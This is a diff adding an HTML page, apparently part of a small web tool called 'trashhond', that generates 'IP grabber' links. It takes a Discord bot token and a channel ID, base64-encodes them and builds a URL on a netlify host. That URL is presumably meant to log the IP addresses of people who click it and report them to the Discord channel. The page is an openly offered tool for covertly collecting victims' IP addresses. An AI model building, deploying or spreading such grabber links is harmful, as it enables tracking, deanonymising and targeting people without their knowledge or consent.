@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link href="https://fonts.googleapis.com/css2?family=Titillium+Web&display=swap" rel="stylesheet">
+
+    <link rel="shortcut icon" type="image/png" href="images/glitchSeal.png" />
+    <style>
+        body {
+            background-color: #080808;
+            color: white;
+            font-family: 'Titillium Web', sans-serif;
+
+            text-align: center;
+        }
+
+
+
+
+        #botField {
+            margin-top: 20px;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid grey;
+            width: 485px;
+            height: 20px;
+            color: white;
+            animation: outFocus 0.5s forwards;
+        }
+
+        #botField:focus {
+            outline: none;
+            animation: inFocus 0.5s forwards;
+
+        }
+
+        #tokenText {
+            margin-top: 80px;
+            font-size: 20px;
+        }
+
+        #idField {
+            margin-top: 20px;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid grey;
+            width: 485px;
+            height: 20px;
+            color: white;
+            animation: outFocus 0.5s forwards;
+
+        }
+
+        #idField:focus {
+            outline: none;
+            animation: inFocus 0.5s forwards;
+
+
+        }
+
+        #idText {
+            margin-top: 180px;
+            font-size: 20px;
+        }
+
+        @keyframes inFocus {
+
+            from {
+                border-bottom: 2px solid grey;
+                /* transform: scale(1); */
+            }
+
+            to {
+                border-bottom: 2px solid cornflowerblue;
+                transform: scale(1.05);
+            }
+        }
+
+        @keyframes outFocus {
+
+            from {
+                border-bottom: 2px solid cornflowerblue;
+                transform: scale(1.05);
+            }
+
+            to {
+                border-bottom: 2px solid grey;
+                transform: scale(1);
+            }
+        }
+
+        #go {
+            margin: 20px;
+            width: 500px;
+            height: 50px;
+            font-family: 'Titillium Web', sans-serif;
+            color: white;
+            background-color: rgb(58, 87, 141);
+            border: none;
+        }
+
+        #go:active,
+        #copyButton:active {
+            background-color: rgb(32, 48, 78);
+            transform: scale(0.98);
+            background-origin: none;
+        }
+
+        #go:focus,
+        #linkField:focus,
+        #copyButton:focus {
+            outline: none;
+
+        }
+
+        #linkField {
+            margin-top: 20px;
+            background-color: #1a1a1a;
+            border: 2px solid #2d2d2d;
+            margin-top: 10px;
+            width: 400px;
+            position: relative;
+            left: -46px;
+            height: 50px;
+            color: white;
+
+
+
+
+        }
+
+        #linkField:focus {
+            outline: none;
+        }
+
+        #copyButton {
+            position: fixed;
+            height: 56px;
+            width: 56px;
+            right: 516px;
+            top: 570px;
+            font-family: 'Titillium Web', sans-serif;
+            color: white;
+            background-color: rgb(58, 87, 141);
+            border: none;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <title>trashhond</title>
+</head>
+
+<body>
+    <h1>Generate grabber link</h1>
+    <h2>Fill in the token and channel ID to generate the IP grabber link</h2>
+    <h2 id="tokenText">Discord Bot Token</h5>
+        <input id="botField" type="text" placeholder="Bot Token:">
+        <br>
+
+        <h2 id="tokenText">Discord Channel ID Token</h5>
+            <input id="idField" type="text" placeholder="Channel ID:">
+            <br>
+            <button id="go" onclick="generate()">Generate URL</button>
+            <br>
+
+            <input id="linkField" type="text" placeholder="Link:" readonly><br>
+            <button id="copyButton" onclick="copylink()">📋<br>Copy</button>
+
+</body>
+<script>
+    function copylink() {
+
+        var linkField = document.getElementById("linkField")
+        linkField.select();
+        document.execCommand("copy");
+        var copyButton = document.getElementById("copyButton")
+        copyButton.style.backgroundColor = "#009624"
+        copyButton.innerText = "📋\nCopied!"
+
+
+    }
+
+    function generate() {
+        var tokenText = document.getElementById("botField").value;
+        var channelText = document.getElementById("idField").value;
+        var linkField = document.getElementById("linkField")
+        linkField.value = `http://trashhond.netlify.app/short/?a=${btoa(tokenText).replace("=", "EQUAL")}&b=${btoa(channelText)}`
+        linkField.style.border = "2px solid #009624"
+        
+
+    }
+
+</script>
+
+
+</html>
